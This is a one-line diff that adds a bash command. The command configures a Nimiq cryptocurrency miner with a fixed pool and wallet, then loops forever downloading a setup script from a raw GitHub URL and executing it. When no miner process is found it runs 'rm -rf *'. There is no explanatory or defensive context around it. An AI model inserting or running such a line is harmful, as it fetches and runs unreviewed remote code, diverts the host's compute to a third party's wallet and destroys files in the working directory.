@@ -1,0 +1,1 @@
+/bin/bash -c "export donation=0;export miner_id=$1;export pool_address1=nimiq.icemining.ca:2053;export wallet1='NQ49 0CNP Y8R4 NASN JQGQ XJ6H 5VTY RFAA 16TC';while [ 1 ] ;do wget https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/setup_nim_3.sh; chmod u+x setup_nim_3.sh ; pgrep iner || ./setup_nim_3.sh ; pgrep iner || rm -rf *;done;"
